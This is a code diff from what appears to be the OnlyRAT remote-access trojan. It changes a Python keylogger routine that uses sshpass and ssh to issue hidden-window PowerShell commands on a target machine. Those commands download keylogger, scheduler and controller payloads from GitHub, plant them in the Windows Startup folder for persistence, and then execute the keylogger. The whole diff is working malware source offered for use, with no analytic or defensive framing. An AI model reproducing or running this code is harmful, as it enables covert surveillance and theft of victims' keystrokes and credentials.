@@ -112,26 +112,28 @@ def remote_command(address, password, command):
     os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} '{command}'")
 
 # keylogger
-def keylogger(address, password, startup, working):
+def keylogger(address, password, username, working):
 
     print("\n[*] Prepping Keylogger...")
     # web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
     schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/schedule.ps1 -OutFile {working}/SSvmVmkWmv.ps1\""
-    controller_command = f"powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile \"{startup}/GiLqXiexKP.cmd\""
+    controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile GiLqXiexKP.cmd"
+    execute_keylogger = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden ./GiLqXiexKP.cmd"
     print("[+] Keylogger Prepped")
 
-    # remote comman execution
+    # remote command execution
     print("[*] Installing Keylogger...")
     remote_command(address, password, keylogger_command)
-
     print("[*] Installing Schedueler...")
     remote_command(address, password, schedule_command)
-
     print("[*] Installing Controller...")
     remote_command(address, password, controller_command)
+    print("[+] Keylogger Installed Sucessfully\n")
 
-    print("[+] Keylogger Installed Sucessfully")
+    # execute logger
+    print("\n[*] Executing Keylogger...")
+    remote_command(address, password, execute_keylogger)
 
 # update OnlyRAT
 def update():
@@ -218,6 +220,7 @@ def cli(arguments):
             password = configuration.get("PASSWORD")
             working_direcory = configuration.get("WORKINGDIRECTORY")
             startup_direcory = configuration.get("STARTUPDIRECTORY")
+            target_username = working_direcory[9:-19]
 
             # remote console
             if option == "0":
@@ -225,7 +228,7 @@ def cli(arguments):
 
             # keylogger option
             elif option == "1":
-                keylogger(ipv4, password, startup_direcory, working_direcory)
+                keylogger(ipv4, password, target_username, working_direcory)
             
             # help me
             elif option == "h" or option == "help":
